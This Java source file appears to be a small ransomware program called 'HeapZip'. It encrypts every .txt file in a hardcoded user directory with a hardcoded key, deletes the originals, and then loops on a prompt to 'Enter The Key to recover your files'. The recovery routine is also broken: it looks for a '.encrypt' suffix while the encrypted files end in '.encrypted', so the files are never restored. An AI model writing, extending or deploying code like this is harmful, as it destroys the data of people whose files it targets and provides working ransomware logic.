package com.heapzip;

import javafx.scene.input.KeyCode;
import sun.lwawt.macosx.CSystemTray;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.Scanner;
import java.util.List;
import java.io.FilenameFilter;


public class Main {
    public static String CodeKey="HeapZip1234";
    public static String basedir="/Users/fuzzer/Desktop/random/";

    public static void main(String[] args) {

        FireUP();

        Encrypt("/Users/fuzzer/Desktop/1/1.txt");

        while(1==1)
             Recover();



    }

    public static void FireUP()
    {
        File file = new File(basedir);
        File[] files = file.listFiles(new FilenameFilter() {

            @Override
            public boolean accept(File dir, String name) {
                if(name.toLowerCase().endsWith(".txt")){
                    return true;
                } else {
                    return false;
                }
            }
        });
        for(File f:files){
            System.out.println(f.getName());
            Encrypt(basedir+f.getName());


        }
    }


    public static void Encrypt(String targetFilePath)
    {

        File inputFile = new File(targetFilePath);
        File encryptedFile = new File(targetFilePath+".encrypted");
        //File decryptedFile = new File(targetFilePath+".decrypted");

        try {
            CrypTool.encrypt(CodeKey, inputFile, encryptedFile);
            System.out.println(inputFile+" is encrypted now...");
            //CrypTool.decrypt(key, encryptedFile, decryptedFile);
            inputFile.delete();
        } catch (CryptoException ex) {
            System.out.println(ex.getMessage());
            ex.printStackTrace();
        }

    }


    public static void Decrypt(String targetFilePath)
    {

        File inputFile = new File(targetFilePath);
        //File encryptedFile = new File(targetFilePath);
        File decryptedFile = new File(targetFilePath+".decrypted");

        try {
            //CrypTool.encrypt(key, inputFile, encryptedFile);
            CrypTool.decrypt(CodeKey,inputFile,decryptedFile);
            System.out.println(inputFile+" is decrypted now...");

        } catch (CryptoException ex) {
            System.out.println(ex.getMessage());
            ex.printStackTrace();
        }

    }



    public static void Recover()
    {


        Scanner myObj = new Scanner(System.in);  // Create a Scanner object
        System.out.println("Enter The Key to recover your files:");

        String code = myObj.nextLine();
        System.out.println("Entered Key is: " + code);  // Output user input

        if (code.equals(CodeKey)){
            System.out.println("Okay....");
            File file = new File(basedir);
            File[] files = file.listFiles(new FilenameFilter() {

                @Override
                public boolean accept(File dir, String name) {
                    if(name.toLowerCase().endsWith(".encrypt")){
                        return true;
                    } else {
                        return false;
                    }
                }
            });
            for(File f:files){
                System.out.println(f.getName());
                Decrypt(basedir+f.getName());
                f.delete();

            }

        }else
            System.out.println("That's wrong!");


    }

}

